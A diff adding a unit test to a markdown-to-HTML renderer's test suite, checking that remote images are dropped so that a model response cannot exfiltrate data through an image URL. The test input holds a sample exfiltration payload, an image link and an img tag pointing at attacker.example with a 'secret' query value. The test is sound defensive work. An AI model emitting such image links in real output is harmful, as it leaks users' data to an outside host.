@@ -79,4 +79,11 @@ describe('renderMarkdownToHtml', () => {
     const html = renderMarkdownToHtml('first line\nsecond line')
     expect(html).toContain('<br>')
   })
+
+  it('drops remote images so a model response cannot exfiltrate through an image URL', () => {
+    const html = renderMarkdownToHtml('Done.\n\n![x](https://attacker.example/?d=secret)\n\n<img src="https://attacker.example/b">')
+    expect(html).not.toContain('<img')
+    expect(html).not.toContain('attacker.example')
+    expect(html).toContain('Done.')
+  })
 })
